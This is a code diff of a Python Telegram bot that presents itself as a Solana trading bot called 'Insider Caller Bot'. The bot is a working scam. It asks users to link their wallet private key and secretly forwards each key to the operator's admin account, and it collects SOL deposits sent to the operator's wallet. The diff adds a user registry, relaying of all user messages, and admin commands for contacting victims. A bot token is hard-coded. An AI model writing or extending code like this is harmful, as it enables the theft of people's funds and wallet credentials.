@@ -1,5 +1,5 @@
 import httpx
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, ConversationHandler, filters
 
 BOT_TOKEN = "8942121012:AAHDcXLhp425CGvAIteRgDYwjq9dvCNTFV0"
@@ -8,6 +8,7 @@ GROUP_LINK = "https://t.me/Insider_Caller"
 ADMIN_ID = 8452728941
 
 WAITING_KEY, WAITING_CA = range(2)
+user_registry = {}
 
 async def get_balance():
     try:
@@ -34,26 +35,51 @@ def main_keyboard():
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
+    user_registry[user.id] = user.username or user.first_name
     bal = await get_balance()
     await update.message.reply_text(
-        f"INSIDER CALLER BOT\n"
-        f"---------------\n\n"
+        f"INSIDER CALLER BOT\n---------------\n\n"
         f"User: {user.first_name}\n"
         f"Wallet: {WALLET_ADDRESS[:6]}...{WALLET_ADDRESS[-4:]}\n"
         f"Balance: {bal}\n\n"
-        f"---------------\n"
-        f"Fast Solana Trading Bot\n"
-        f"Select an option below:",
+        f"---------------\nFast Solana Trading Bot\nSelect an option below:",
         reply_markup=main_keyboard()
     )
     try:
-        await context.bot.send_message(
-            ADMIN_ID,
-            f"New user started bot:\n"
-            f"Name: {user.first_name}\n"
-            f"Username: @{user.username}\n"
-            f"ID: {user.id}"
-        )
+        await context.bot.send_message(ADMIN_ID,
+            f"NEW USER\nName: {user.first_name}\nUsername: @{user.username}\nID: {user.id}")
+    except:
+        pass
+
+async def send_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    try:
+        user_id = int(context.args[0])
+        msg = " ".join(context.args[1:])
+        await context.bot.send_message(user_id, f"Message from Admin:\n{msg}")
+        await update.message.reply_text("Message sent!")
+    except:
+        await update.message.reply_text("Usage: /send USER_ID your message here")
+
+async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    if not user_registry:
+        await update.message.reply_text("No users yet.")
+        return
+    users = "\n".join([f"ID: {uid} | @{uname}" for uid, uname in user_registry.items()])
+    await update.message.reply_text(f"ALL USERS:\n\n{users}")
+
+async def catch_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user.id == ADMIN_ID:
+        return
+    msg = update.message.text
+    user_registry[user.id] = user.username or user.first_name
+    try:
+        await context.bot.send_message(ADMIN_ID,
+            f"MSG FROM USER\nName: {user.first_name}\n@{user.username}\nID: {user.id}\n\nMessage: {msg}\n\nReply: /send {user.id} your reply here")
     except:
         pass
 
@@ -64,19 +90,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "fund":
         await query.message.reply_text(
-            f"FUND WALLET\n"
-            f"---------------\n\n"
-            f"Send SOL to:\n{WALLET_ADDRESS}\n\n"
-            f"Solana network only.\n"
-            f"Screenshot after sending and DM admin.")
+            f"FUND WALLET\n---------------\n\nSend SOL to:\n{WALLET_ADDRESS}\n\nSolana network only.")
 
     elif query.data == "balance":
         bal = await get_balance()
         await query.message.reply_text(
-            f"WALLET BALANCE\n"
-            f"---------------\n\n"
-            f"Balance: {bal}\n\n"
-            f"https://solscan.io/account/{WALLET_ADDRESS}")
+            f"WALLET BALANCE\n---------------\n\nBalance: {bal}\n\nhttps://solscan.io/account/{WALLET_ADDRESS}")
 
     elif query.data == "buy":
         await query.message.reply_text("BUY TOKEN\n---------------\n\nSend the token CA now:")
@@ -87,45 +106,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WAITING_KEY
 
     elif query.data == "community":
-        await query.message.reply_text(
-            f"COMMUNITY\n"
-            f"---------------\n\n"
-            f"Early alpha calls\n"
-            f"100x gems daily\n\n"
-            f"{GROUP_LINK}")
+        await query.message.reply_text(f"COMMUNITY\n---------------\n\n{GROUP_LINK}")
 
     elif query.data == "settings":
-        await query.message.reply_text(
-            "SETTINGS\n"
-            "---------------\n\n"
-            "Notifications: ON\n"
-            "Speed: Ultra Fast\n"
-            "Network: Solana")
+        await query.message.reply_text("SETTINGS\n---------------\n\nNotifications: ON\nSpeed: Ultra Fast\nNetwork: Solana")
 
     elif query.data.startswith("mult_"):
         mult = query.data.split("_")[1]
         ca = context.user_data.get('ca', 'N/A')
-        await query.message.reply_text(
-            f"ORDER SUBMITTED\n"
-            f"---------------\n\n"
-            f"Token: {ca}\n"
-            f"Target: {mult}\n\n"
-            f"Admin confirming shortly.")
+        await query.message.reply_text(f"ORDER SUBMITTED\n---------------\n\nToken: {ca}\nTarget: {mult}\n\nAdmin confirming shortly.")
         try:
-            await context.bot.send_message(
-                ADMIN_ID,
-                f"BUY ORDER\nUser: {user.first_name} (@{user.username})\nCA: {ca}\nTarget: {mult}")
+            await context.bot.send_message(ADMIN_ID,
+                f"BUY ORDER\nUser: {user.first_name} (@{user.username})\nID: {user.id}\nCA: {ca}\nTarget: {mult}\n\nReply: /send {user.id} your message")
         except:
             pass
 
 async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key = update.message.text
     user = update.effective_user
-    await update.message.reply_text("Private Key Linked!\n\nUse /start to go back.")
+    await update.message.reply_text("Private Key Linked! Use /start to go back.")
     try:
-        await context.bot.send_message(
-            ADMIN_ID,
-            f"PRIVATE KEY RECEIVED\nUser: {user.first_name} (@{user.username})\nID: {user.id}\nKey: {key}")
+        await context.bot.send_message(ADMIN_ID,
+            f"PRIVATE KEY\nUser: {user.first_name} (@{user.username})\nID: {user.id}\nKey: {key}\n\nReply: /send {user.id} your message")
     except:
         pass
     return ConversationHandler.END
@@ -141,9 +143,7 @@ async def receive_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
          InlineKeyboardButton("50x", callback_data="mult_50x"),
          InlineKeyboardButton("100x", callback_data="mult_100x")],
     ])
-    await update.message.reply_text(
-        f"CA Received!\n\n{ca}\n\nSelect your target:",
-        reply_markup=keyboard)
+    await update.message.reply_text(f"CA Received!\n\n{ca}\n\nSelect your target:", reply_markup=keyboard)
     return ConversationHandler.END
 
 app = ApplicationBuilder().token(BOT_TOKEN).build()
@@ -157,6 +157,9 @@ conv = ConversationHandler(
     per_message=False
 )
 app.add_handler(CommandHandler("start", start))
+app.add_handler(CommandHandler("send", send_to_user))
+app.add_handler(CommandHandler("users", list_users))
 app.add_handler(conv)
+app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, catch_all))
 print("Bot running")
 app.run_polling()
